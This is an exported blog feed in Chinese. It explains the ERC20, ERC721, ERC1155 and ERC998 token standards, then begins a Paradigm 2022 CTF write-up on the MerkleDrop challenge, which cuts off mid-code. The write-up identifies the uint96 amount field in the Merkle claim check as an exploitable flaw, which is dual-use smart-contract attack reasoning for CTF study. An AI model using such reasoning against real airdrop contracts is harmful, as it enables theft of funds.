            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ERC20-721-1155-998</title>
      <link href="/ERC20-721-1155-998/"/>
      <url>/ERC20-721-1155-998/</url>
      
        <content type="html"><![CDATA[<h1 id="ERC20-721-1155，998协议分析"><a href="#ERC20-721-1155，998协议分析" class="headerlink" title="ERC20,721,1155，998协议分析"></a>ERC20,721,1155，998协议分析</h1><hr><pre><code>author：Thomas_Xu</code></pre><p>最近在总结归纳代币协议，所以把EIP20,721,1155,998首先拿出来对比分析一下。</p><p>首先归纳总结一下这三者的区别：</p><div class="table-container"><table><thead><tr><th style="text-align:left">标准</th><th style="text-align:left">ERC-20</th><th style="text-align:left">ERC-721</th><th style="text-align:left">ERC-1155</th></tr></thead><tbody><tr><td style="text-align:left">代币类型</td><td style="text-align:left">同质化代币</td><td style="text-align:left">非同质化代币</td><td style="text-align:left">同质化代币、非同质化代币、介于同质化和非同质化代币之间可以互相切换的代币</td></tr><tr><td style="text-align:left">特点</td><td style="text-align:left">统一性、可互换、可拆分</td><td style="text-align:left">独特性、不可互换、不可拆分</td><td style="text-align:left">前两者的特点都有，且在一定程度上可以在两者中切换</td></tr><tr><td style="text-align:left">生成处理</td><td style="text-align:left">一次性只能生成一种 ERC-20 代币，一次性只能进行单笔单对象交易，并且交易处理需要多次批准</td><td style="text-align:left">一次性只能生成一种 ERC-721 代币，一次性只能进行单笔单对象交易，并且交易处理需要多次批准</td><td style="text-align:left">一次性可以生成多种 ERC-1155 代币资产类别，一次性可以进行多笔多对象交易，交易处理只需要一次批准</td></tr></tbody></table></div><p>接下来我们分开分析三者的实现逻辑（这里我们不分析其实现方式）</p><h2 id="ERC20"><a href="#ERC20" class="headerlink" title="ERC20"></a>ERC20</h2><p><code>ERC20</code>是一种<code>同质化token</code>, <code>token</code>之间是完全等价的. <code>token</code>就是一个<code>uint256</code>类型的数字.</p><p><code>ERC20</code>也是在目前普及最多的代币协议。</p><p><a href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol" target="_blank" rel="noopener">ERC20源码</a></p><h3 id="EIP20代币标准"><a href="#EIP20代币标准" class="headerlink" title="EIP20代币标准"></a>EIP20代币标准</h3><p><code>EIP20</code>提案是由Fabian Vogelsteller和Vitalik Buterin在2015年11月创建的代币标准，定义了代币合约的标准接口，提供了转移代币的基本功能，并允许代币获得批准，以方便其他链上的第三方使用。此外，该标准接口允许以太坊上定义的任何代币被其他应用程序（钱包、去中心化交易所等）重用。</p><h3 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h3><p>ERC20 的功能包括但不限于以下几点：</p><ul><li>转账：将代币从一个帐户转到另一个帐户</li><li>查询余额：获取帐户的当前代币余额</li><li>查询总量：获取网络上可用代币的总供应量</li><li>代币授权：批准一个帐户中一定的代币金额由第三方帐户使用</li></ul><h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><p><img src="ERC20_interface.jpg" alt=""></p><p>当要实现一个满足 ERC-20 接口标准的 Token 智能合约时，该合约必须满足以上内容实现。</p><h4 id="name"><a href="#name" class="headerlink" title="name"></a>name</h4><p>返回当前 Token 的名称，比如：DSToken，可选项。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">function name() constant returns (string name)</span><br></pre></td></tr></table></figure><p>在智能合约中定义，可通过构造方法传值进行初始化，也可直接在代码中指定：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string public name;</span><br></pre></td></tr></table></figure><h4 id="symbol"><a href="#symbol" class="headerlink" title="symbol"></a>symbol</h4><p>symbol 就是通常使用的简称，比如：EOS，可选项。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">function symbol() constant returns (string symbol)</span><br></pre></td></tr></table></figure><p>与 name 一样，可通过构造方法传值进行初始化，也可直接在代码中指定：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string public symbol;</span><br></pre></td></tr></table></figure><h4 id="decimals"><a href="#decimals" class="headerlink" title="decimals"></a>decimals</h4><p>当前代币支持的最小精度，也就是小数点后多少位，比如此值为 2，表示 1 个 Token 可分割为 100 份。对应以太坊来说，ETH 的此值为 18，也就是说一个 ETH 可以分割为小数点后 18 位的精度。一般情况下，当查询一个 Token 余额时，是按照最小精度的整型来显示的。比如 decimals 为 2，发行一个代币，那么查询到的结果为 100，此值为可选项。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">function decimals() constant returns (uint8 decimals)</span><br></pre></td></tr></table></figure><p>与 name 和 symbol 一样，可通过构造方法传值进行初始化，也可直接在代码中指定：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uint8 public decimals;</span><br></pre></td></tr></table></figure><h4 id="totalSupply"><a href="#totalSupply" class="headerlink" title="totalSupply"></a>totalSupply</h4><p>Token 的发型总量，此处需注意这个数量的单位与 decimals 中指定的最小单位一致，注意它们之间的换算</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">function totalSupply() constant returns (uint256 totalSupply)</span><br></pre></td></tr></table></figure><h4 id="balanceOf"><a href="#balanceOf" class="headerlink" title="balanceOf"></a>balanceOf</h4><p>返回地址为_owner的账户的代币余额。返回余额以最小单位计算。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">function balanceOf(address _owner) constant returns (uint256 balance)</span><br></pre></td></tr></table></figure><p>此账户余额对应智能合约代码中余额的存储，所有的地址与余额之间的关联都是通过此 mapping 进行存储：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mapping (address &#x3D;&gt; uint256) public balanceOf;</span><br></pre></td></tr></table></figure><h4 id="transfer"><a href="#transfer" class="headerlink" title="transfer"></a>transfer</h4><p>代币转账操作，从执行转账的地址转出指定数量的代币到目标地址，并且必须触发 Transfer 事件。如果执行转账地址没有足够的余额则抛出异常，支持转账金额为 0。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">function transfer(address to, uint256 value) public returns (bool);</span><br></pre></td></tr></table></figure><h4 id="transferFrom"><a href="#transferFrom" class="headerlink" title="transferFrom"></a>transferFrom</h4><p>从<code>_from</code>地址发送数量为<code>_value</code>的 token 到<code>_to</code>地址，必须触发 Transfer 事件，主要应用场景为智能合约中对操作账户进行授权，然后达到某个条件时，操作账户可以对被操作账户进行转账操作。如果无权操作则需抛出异常，与 tranfer 相同，可以进行 0 值操作。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">function transferFrom(address _from, address _to, uint256 _value) returns (bool success)</span><br></pre></td></tr></table></figure><h4 id="approve"><a href="#approve" class="headerlink" title="approve"></a>approve</h4><p>设置<code>_spender</code>地址可以从操作此方法的地址那里获得的最高金额，此方法可以多次调用。注意：为了阻止向量攻击，客户端需要确认以这样的方式创建用户接口，即将它们设置为 0，然后将其设置为同一个花费者的另一个值。虽然合同本身不应该强制执行，允许向后兼容以前部署的合同兼容性。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">function approve(address _spender, uint256 _value) returns (bool success)</span><br></pre></td></tr></table></figure><h4 id="allowance"><a href="#allowance" class="headerlink" title="allowance"></a>allowance</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">function allowance(address _owner, address _spender) constant returns (uint256 remaining)</span><br></pre></td></tr></table></figure><h2 id="ERC721"><a href="#ERC721" class="headerlink" title="ERC721"></a>ERC721</h2><p>和<code>ERC20</code>一样，<code>ERC721</code>同样是一个代币标准，<code>ERC721</code>官方简要解释是Non-Fungible Tokens，简写为NFTs，多翻译为非同质代币。</p><p><a href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC721/ERC721.sol" target="_blank" rel="noopener">ERC721源码</a></p><h3 id="功能-1"><a href="#功能-1" class="headerlink" title="功能"></a>功能</h3><p>和<code>ERC20</code>差不太多,<code>ERC721</code> 的功能包括但不限于以下几点：</p><ul><li>转账：将代币从一个帐户转到另一个帐户</li><li>查询余额：获取帐户的当前代币余额</li><li>查询总量：获取网络上可用代币的总供应量</li><li>代币授权：批准一个帐户中一定的代币金额由第三方帐户使用</li></ul><h3 id="函数-1"><a href="#函数-1" class="headerlink" title="函数"></a>函数</h3><p>ERC721最为一个合约标准，提供了在实现ERC721代币时必须要遵守的协议，要求每个ERC721标准合约需要实现ERC721及ERC165接口，接口定义如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.20;</span><br><span class="line"></span><br><span class="line">interface ERC721  &#123;</span><br><span class="line"></span><br><span class="line">    event Transfer(address indexed _from, address indexed _to, uint256 _tokenId);</span><br><span class="line">    event Approval(address indexed _owner, address indexed _approved, uint256 _tokenId);</span><br><span class="line">    event ApprovalForAll(address indexed _owner, address indexed _operator, bool _approved);</span><br><span class="line"></span><br><span class="line">    function balanceOf(address _owner) external view returns (uint256);</span><br><span class="line">    function ownerOf(uint256 _tokenId) external view returns (address);</span><br><span class="line">    </span><br><span class="line">    function safeTransferFrom(address _from, address _to, uint256 _tokenId, bytes data) external payable;</span><br><span class="line">    function safeTransferFrom(address _from, address _to, uint256 _tokenId) external payable;</span><br><span class="line">    function transferFrom(address _from, address _to, uint256 _tokenId) external payable;</span><br><span class="line">    </span><br><span class="line">    function approve(address _approved, uint256 _tokenId) external payable;</span><br><span class="line">    function setApprovalForAll(address _operator, bool _approved) external;</span><br><span class="line">    function getApproved(uint256 _tokenId) external view returns (address);</span><br><span class="line">    function isApprovedForAll(address _owner, address _operator) external view returns (bool);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="name-1"><a href="#name-1" class="headerlink" title="name"></a>name</h4><p>该函数应当返回通证的名称。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function name() constant returns(string name)&#123;</span><br><span class="line">    return &quot;My Non-FungibleToken&quot;;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Symbol"><a href="#Symbol" class="headerlink" title="Symbol"></a>Symbol</h4><p>该函数应当返回通证的符号，它有助于提高与ERC20的兼容性。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">function symbol() external view returns (string _symbol);</span><br></pre></td></tr></table></figure><h4 id="totalSupply-1"><a href="#totalSupply-1" class="headerlink" title="totalSupply"></a>totalSupply</h4><p>该函数应当返回区块链上供应的通证总数量，该数量不一定是固定不变的。 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">contract MyNFT &#123;</span><br><span class="line">  uint256 private totalSupply &#x3D; 1000000000;</span><br><span class="line"> </span><br><span class="line">  function totalSupply() constant returns (uint256supply)&#123;</span><br><span class="line">    return totalSupply;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="balanceOf-1"><a href="#balanceOf-1" class="headerlink" title="balanceOf"></a>balanceOf</h4><p> 返回由_owner 持有的NFTs的数量。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">function balanceOf(address _owner) external view returns (uint256);</span><br></pre></td></tr></table></figure><h4 id="ownerOf"><a href="#ownerOf" class="headerlink" title="ownerOf"></a>ownerOf</h4><p>返回tokenId代币持有者的地址。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">function ownerOf(uint256 _tokenId) external view returns (address);</span><br></pre></td></tr></table></figure><h4 id="approve-1"><a href="#approve-1" class="headerlink" title="approve"></a>approve</h4><p>该函数用来授权给另一主体代表持有人进行通证转移操作。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">function approve(address _to, uint256 _tokenId);</span><br></pre></td></tr></table></figure><h4 id="safeTransferFrom"><a href="#safeTransferFrom" class="headerlink" title="safeTransferFrom"></a>safeTransferFrom</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">function safeTransferFrom(address _from, address _to, uint256 _tokenId, bytes data) external payable;</span><br></pre></td></tr></table></figure><p>安全地转移NFT所有权并发送数据，即将<code>tokenId</code>为参数<code>_tokenId</code>的NFT的所有权由地址_from转移给地址_to，并将额外的数据data发送给地址_to，并触发Transfer事件。参数data没有格式要求。若地址_to是合约地址，data一般包含函数签名值以及函数参数值，当data发送给_to时，会调用合约_to中签名值对应的函数或者回调函数。</p><p>函数能够执行，必需满足以下条件：</p><ul><li>参数<em>from是</em><code>tokenId</code>对应的NFT的所有者</li><li>调用者sender有权转移_<code>tokenId</code>对应NFT的所有权，即：<code>msg.sender</code>是<code>tokenId</code>对应NFT的所有者或者得到了其授权。</li><li>参数_to不是零地址</li></ul><p>另外，该函数使用了<code>payable</code>修饰符，因此可以接收以太坊原生代币（以太币）。</p><h4 id="safeTransferFrom-1"><a href="#safeTransferFrom-1" class="headerlink" title="safeTransferFrom"></a>safeTransferFrom</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">function safeTransferFrom(address _from, address _to, uint256 _tokenId) external payable;</span><br></pre></td></tr></table></figure><p>安全地转移NFT所有权，即将<code>tokenId</code>为参数<code>_tokenId</code>的NFT的所有权由地址_from转移给地址_to，并触发Transfer事件。</p><p>调用该函数等价于调用上面的safeTransferFrom中data参数是””的情况，即：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">safeTransferFrom(_from, _to,  _tokenId, &quot;&quot;)</span><br></pre></td></tr></table></figure><h4 id="transferFrom-1"><a href="#transferFrom-1" class="headerlink" title="transferFrom"></a>transferFrom</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">function transferFrom(address _from, address _to, uint256 _tokenId) external payable;</span><br></pre></td></tr></table></figure><p>转移NFT所有权，即将<code>tokenId</code>为参数<code>_tokenId</code>的NFT的所有权由地址_from转移给地址_to，并触发Transfer事件。</p><h4 id="approve-2"><a href="#approve-2" class="headerlink" title="approve"></a>approve</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">function approve(address _approved, uint256 _tokenId) external payable;</span><br></pre></td></tr></table></figure><p>将<code>tokenId</code>为参数<code>_tokenId</code>的NFT授权给地址_approved，或者更新授权地址为_approved，并且触发Approve事件。</p><p>函数能够执行，必需满足以下条件：</p><ul><li>调用者sender有权转移_tokenId对应NFT的所有权，即：msg.sender是_tokenId对应NFT的所有者或者得到了其授权。</li></ul><h2 id="ERC1155"><a href="#ERC1155" class="headerlink" title="ERC1155"></a><strong>ERC1155</strong></h2><p>根据<code>ERC1155</code>的<a href="[ERC-1155 多代币标准 | ethereum.org](https://ethereum.org/zh/developers/docs/standards/tokens/erc-1155/">官方文档</a>)的介绍，<code>ERC1155</code>是用于多种代币管理的合约标准接口。 单个部署的合约可以包括同质化代币、非同质化代币或其他配置（如半同质化代币）的任何组合。</p><h3 id="多代币标准"><a href="#多代币标准" class="headerlink" title="多代币标准"></a><strong>多代币标准</strong></h3><p>多代币标准的的目的很单纯，就是创建一个智能合约接口，可以代表和控制任何数量的同质化和非同质化代币类型。 这样一来，<code>ERC-1155</code> 代币就具有与 <a href="https://ethereum.org/zh/developers/docs/standards/tokens/erc-20/" target="_blank" rel="noopener">ERC-20</a> 和 <a href="https://ethereum.org/zh/developers/docs/standards/tokens/erc-721/" target="_blank" rel="noopener">ERC-721</a> 代币相同的功能，甚至可以同时使用这两者的功能。 而最重要的是，它能改善这两种标准的功能，使其更有效率，并纠正 <code>ERC-20</code> 和 <code>ERC-721</code>标准上明显的实施错误。</p><p><a href="https://eips.ethereum.org/EIPS/eip-1155" target="_blank" rel="noopener">EIP-1155</a> 中对 ERC-1155 代币进行了全面的描述。</p><h3 id="EIP1155代币标准"><a href="#EIP1155代币标准" class="headerlink" title="EIP1155代币标准"></a>EIP1155代币标准</h3><p><code>BIP1155</code>提案概述了一个标准的智能合约接口，可以代表任意数量的同质化代币和非同质化代币类型。ERC20等现有标准要求为每种代币类型部署单独的合约。ERC721标准的代币ID是一个单一的非同质化索引，每组非同质化代币都会被部署为具有统一设置的独立的合约。相比之下，ERC1155多代币标准允许每个代币ID表示一个新的可配置代币类型，它可以有自己的元数据、供应量以及其他属性。</p><p>每个函数的参数集合中都会包含_id参数，表示交易中的一种特定的代币或代币类型。</p><h3 id="ERC-1155-的功能和特点"><a href="#ERC-1155-的功能和特点" class="headerlink" title="ERC-1155 的功能和特点"></a>ERC-1155 的功能和特点</h3><h4 id="批量传输"><a href="#批量传输" class="headerlink" title="批量传输"></a>批量传输</h4><p>通过一次合约调用传输多种资产。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; ERC-20</span><br><span class="line">function transferFrom(address from, address to, uint256 value) external returns (bool);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; ERC-1155</span><br><span class="line">function safeBatchTransferFrom(</span><br><span class="line">    address _from,</span><br><span class="line">    address _to,</span><br><span class="line">    uint256[] calldata _ids,</span><br><span class="line">    uint256[] calldata _values,</span><br><span class="line">    bytes calldata _data</span><br><span class="line">) external;</span><br></pre></td></tr></table></figure><p>批量传输和ERC20的传输非常相似。唯一的区别就是我们将数值作为数组传递。同时传递了数组id。</p><p>举个例子：我们给出<code>ids=[3, 6, 13]</code> 和 <code>values=[100, 200, 5]</code>，传输结果将是：</p><ol><li>将 id 3 的 100 个代币从 <code>_from</code> 传输到 <code>_to</code>。</li><li>将 id 6 的 200 个代币从 <code>_from</code> 传输到 <code>_to</code>。</li><li>将 id 13 的 5 个代币从 <code>_from</code> 转移到 <code>_to</code>。</li></ol><p>值得注意的是在ERC-1155中，我们只有<code>transferFrom</code>而没有<code>transfer</code>。</p><h4 id="批量余额"><a href="#批量余额" class="headerlink" title="批量余额"></a>批量余额</h4><p>我们也用ERC20版本的余额查询作为对比：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; ERC-20</span><br><span class="line">function balanceOf(address owner) external view returns (uint256);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; ERC-1155</span><br><span class="line">function balanceOfBatch(</span><br><span class="line">    address[] calldata _owners,</span><br><span class="line">    uint256[] calldata _ids</span><br><span class="line">) external view returns (uint256[] memory);</span><br></pre></td></tr></table></figure><p>其实可以发现，在ERC1155版本中查询余额会更加方便，我们可以在单次调用中获取多个余额。参数中传递所有者账户数组和代币id数组。</p><p>举个例子，对于给出的 <code>_ids=[3, 6, 13]</code> 和 <code>_owners=[0xbeef..., 0x1337..., 0x1111...]</code>，返回值将为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">    balanceOf(0xbeef...),</span><br><span class="line">    balanceOf(0x1337...),</span><br><span class="line">    balanceOf(0x1111...)</span><br><span class="line">]</span><br></pre></td></tr></table></figure><h4 id="批量审批"><a href="#批量审批" class="headerlink" title="批量审批"></a>批量审批</h4><p>ERC1155的授权过程与ERC20有所不同，这里不是批准特定的金额，而是通过<code>setApprovalForall</code>函数设置操作账户为已批准或未批准（传参：批准为true，不批准为false）</p><p>查看当前的审批状态可以通过 <code>isApprovedForall</code> 完成。 如您所见，要么全部批准，要么不批准。 不能定义要批准代币的数量，甚至代币类型。</p><p>这是考虑到简洁性而故意设计的。 您只能批准一个地址的所有代币。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; ERC-1155</span><br><span class="line">function setApprovalForAll(</span><br><span class="line">    address _operator,</span><br><span class="line">    bool _approved</span><br><span class="line">) external;</span><br><span class="line"></span><br><span class="line">function isApprovedForAll(</span><br><span class="line">    address _owner,</span><br><span class="line">    address _operator</span><br><span class="line">) external view returns (bool);</span><br></pre></td></tr></table></figure><h4 id="回调函数"><a href="#回调函数" class="headerlink" title="回调函数"></a>回调函数</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function onERC1155BatchReceived(</span><br><span class="line">    address _operator,</span><br><span class="line">    address _from,</span><br><span class="line">    uint256[] calldata _ids,</span><br><span class="line">    uint256[] calldata _values,</span><br><span class="line">    bytes calldata _data</span><br><span class="line">) external returns(bytes4);</span><br></pre></td></tr></table></figure><p>基于 <a href="https://eips.ethereum.org/EIPS/eip-165" target="_blank" rel="noopener">EIP-165</a> 的协议支持，ERC-1155 只支持智能合约的接收回调函数。回调函数必须返回一个事先预定义的 4 字节值，这个值被指定为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bytes4(keccak256(&quot;onERC1155BatchReceived(address,address,uint256[],uint256[],bytes)&quot;))</span><br></pre></td></tr></table></figure><p>当接收合约返回这一值时，意味着合约知道如何处理 ERC-1155 代币并接受转账。 </p><h2 id="ERC998"><a href="#ERC998" class="headerlink" title="ERC998"></a>ERC998</h2><p>ERC-998名叫可拆解非同质化代币（Composable NFT，缩写为CNFT）。它的设计可以让任何一个NFT可以拥有其他NFT或FT。转移CNFT时，就是转移CNFT所拥有的整个层级结构和所属关系。简单来说就是一个ERC-998的物品可以包含多个ERC-721和ERC-20形式的物品。</p><p>举个简单的例子，可以帮助我们更快的理解ERC998到底有什么用。</p><blockquote><p>比如说你想在区块链游戏当中拥有一个角色，那么这个角色本身就是一个基于ERC721的NFT。当你达到一定等级时，一定想要给角色买一些装备，例如衣服等等。但是每一样装备都是一个NFT的话，其实在角色和装备之间，是没有联系的，都是作为单独的NFT存在。</p><p>但是在ERC998出现以后，我们可以把角色看为父token，装备等等都是子token，这样一来，二者便变得不可分割，在交易角色的同时，装备等等也会同时被交易。</p></blockquote><p>我认为，ERC998除了在游戏当中的应用，还可以应用在历史版本迭代等问题上，总之，ERC998的可应用性，还是非常强的。</p><h3 id="简单总结"><a href="#简单总结" class="headerlink" title="简单总结"></a>简单总结</h3><p>ERC-721标准的扩展，使ERC721代币能够拥有其他ERC721代币和<a href="https://github.com/ethereum/EIPs/blob/master/EIPS/eip-721.md" target="_blank" rel="noopener">ERC20</a>代币。</p><p>ERC-20和<a href="https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20.md" target="_blank" rel="noopener">ERC-223</a>标准的扩展，使ERC20和ERC223代币由<a href="https://github.com/ethereum/EIPs/issues/223" target="_blank" rel="noopener">ERC721</a>代币拥有。</p><p>此规范涵盖四种不同类型的可组合令牌：</p><ol><li>ERC998ERC721 自上而下的可组合代币是一种 ERC721 代币，具有用于拥有其他 ERC721 代币的附加功能。</li><li>ERC998ERC20 自上而下的可组合代币是一种 ERC721 代币，具有拥有 ERC20 代币的附加功能。</li><li>ERC998ERC721自下而上可组合的代币是一种ERC721代币，具有由ERC721代币拥有的附加功能。</li><li>ERC998ERC20自下而上可组合的ERC20代币具有ERC721代币拥有的附加功能。</li></ol><p>开发时如何选择这四种类型的可组合令牌呢？</p><ul><li><p>如果您想将常规 ERC721 代币转移到不可替代代币，请使用自上而下的可组合代币。</p></li><li><p>如果您想将不可替代的代币转移到常规的ERC721代币，请使用自下而上的可组合代币。</p></li></ul><p>ERC-998的结构中包含两种映射关系，父tokenID映射到子token合约地址。当子token是NFT/FT时，子合约地址映射到对应的子tokenID/余额。 也就是说对于子ERC-721 token，ERC-998会追踪tokenID，而对于ERC-20 token，ERC-998会追踪token数量。 这种内部记账将有助于确保不拥有父token的人无法转移子token。</p>]]></content>
      
      
      <categories>
          
          <category> EIP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> EIP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Paradigm 题解 MerkleDrop</title>
      <link href="/paradigm22-merkleDrop/"/>
      <url>/paradigm22-merkleDrop/</url>
      
        <content type="html"><![CDATA[<h1 id="paradigm-2022-ctf-题解——MerkleDrop"><a href="#paradigm-2022-ctf-题解——MerkleDrop" class="headerlink" title="paradigm 2022 ctf 题解——MerkleDrop"></a>paradigm 2022 ctf 题解——MerkleDrop</h1><hr><pre><code>author：Thomas_Xu</code></pre><p><strong>环境配置</strong>:<br>由于题目环境需要使用docker，环境配置有点繁琐。我重新搭了一个hardhat框架的测试环境,而由于题目出在以太坊的主链上,并使用<code>Alchemy</code>fork了一个主网节点进行测试</p><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>首先先来看一下这道题目的描述<code>Were you whitelisted?</code>你是否在白名单里？显而易见，这是一道关于空头白名单的问题。而题目给我们提供了64个叶子节点的验证信息，其中包括每个用户地址对应的 <code>index</code>，<code>amount</code> 以及 <code>proof</code> 验证hash。用户可以凭此文件中的相关 Proofs 到合约中 Claim 相应数量的 Token。似乎我们要通过某种漏洞来获取白名单权限，我们进入到<code>Setup</code>中去看判断条件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">function isSolved() public view returns (bool) &#123;</span><br><span class="line">        bool condition1 &#x3D; token.balanceOf(address(merkleDistributor)) &#x3D;&#x3D; 0;</span><br><span class="line">        bool condition2 &#x3D; false;</span><br><span class="line">        for (uint256 i &#x3D; 0; i &lt; 64; ++i) &#123;</span><br><span class="line">            if (!merkleDistributor.isClaimed(i)) &#123;</span><br><span class="line">                condition2 &#x3D; true;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return condition1 &amp;&amp; condition2;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>有两个判题：</p><ul><li>要求领完空投钱包的余额</li><li>要求白名单里至少有1个人没有领空投</li></ul><p>算了一下，json文件中64个地址能领的金额相加刚好等于<code>merkleDistributor</code>中的余额 75 ETH，想要同时完成这两个判题貌似是不可能的事。</p><p>如果是按照标准实现的Merkle Tree我们几乎不可能对其进行攻击。那么让我们来对比一下这里的代码和标准实现的Merkle Tree有什么不同吧。<br><img src="merkledrop_01.jpg" alt=""></p><p>这个<code>uint96</code>是最可疑的地方</p><p>让我们回顾一下MerkleTree的验证过程</p><p><img src="MerkleHash.png" alt=""></p><p>Merkle Tree 的基本原理是依靠叶子节点的值一层层计算出 hash，最终得到 Root 值，验证某一个叶子节点是否在 Merkle Tree 中，只需提供相对应的 Proofs 路径进行计算，观察最终的 Root 值是否一致即可。</p><p>而这个题最巧妙的一点就是：由于<code>amout</code>字段使用了uint96，导致出现了一个巧合。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function claim(uint256 index, address account, uint96 amount, bytes32[] memory merkleProof) external &#123;</span><br><span class="line">        ...</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; Verify the merkle proof.</span><br><span class="line">        bytes32 node &#x3D; keccak256(abi.encodePacked(index, 